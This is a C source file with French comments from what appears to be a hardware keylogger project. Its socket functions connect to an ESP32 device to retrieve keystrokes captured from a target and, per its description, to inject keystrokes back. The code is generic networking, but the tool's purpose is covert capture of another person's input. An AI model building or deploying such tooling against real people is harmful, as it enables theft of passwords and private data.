/***********************************************************************
* FILENAME :  server_interact.c
*
* DESCRIPTION :
*       Ce fichier contient les declaration des fonction qui permet
*       la communication avec le serveur ouvert par l'ESP32 qui permet
*       de recuperer les touches transmit pat la cible mais aussi de
*       transmettre des touches a la cible.
*
* AUTHOR :    Yanis GENY          START DATE :    20 Jan 2024
************************************************************************/

#include "headers/server_interact.h"

struct server_interact_t server;

/*
*  init_server_connection permet d'initier une connection au serveur identifier
*  via les informations donne par les parsers.
*
*  input : none
*
*  output:
*    _SOCKET_ERROR_  -> en cas d'erreur de l'ouverture de la socket
*    _CONNECT_ERROR_ -> en cas d'erreur de connection au serveur
*    _SUCCESS_       -> si pas d'erreur
*/
int init_server_connection(void) {
	bzero(&server, sizeof(struct server_interact_t));

	// ouverture d'une socket
	server.sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (server.sockfd < 0) return _SOCKET_ERROR_;

	// remplir la structure contenant les donnees du serveur
	server.serveraddr.sin_family = AF_INET;
	inet_aton(parser.target, &server.serveraddr.sin_addr); // affecter l'ip du keylogger
	server.serveraddr.sin_port = htons(parser.port);       // affectation du port du serveur

	if (connect(server.sockfd, (const struct sockaddr *)&(server.serveraddr), sizeof(server.serveraddr)) < 0)
		return _CONNECT_ERROR_;

	return _SUCCESS_;
}

/*
*  close_server_connection permet de stopper la connection au serveur
*
*  input : none
*
*  output:
*     _FAIL_CLOSE_SOCKET_ -> en cas d'erreur de fermeture de la connection
*     _SUCCESS_           -> si pas d'erreur
*/
int close_server_connection(void) {
	if (close(server.sockfd))
		return _FAIL_CLOSE_SOCKET_;
	return _SUCCESS_;
}

/*
*  read_keys permet de lire les touches que le serveur transmet. Les touches
*  sont enregistrer dans la structure
*
*  input : none
*
*  output:
*    _SERVER_NOT_INIT_ -> si la connection au serveur n'est pas etablie
*    _ERROR_SRV_READ_  -> si une erreur est arrive lors de la lecture
*    _SUCCESS_         -> si pas d'erreur
*/
int read_keys(void) {
	int n;

	if (server.sockfd < 0) return _SERVER_NOT_INIT_;

	bzero(server.buffer, sizeof(char)*NET_BUFFER_SIZE);
	n = read(server.sockfd, server.buffer, sizeof(char)*NET_BUFFER_SIZE);
	if (n < 0)
		return _ERROR_SRV_READ_;

	return _SUCCESS_;
}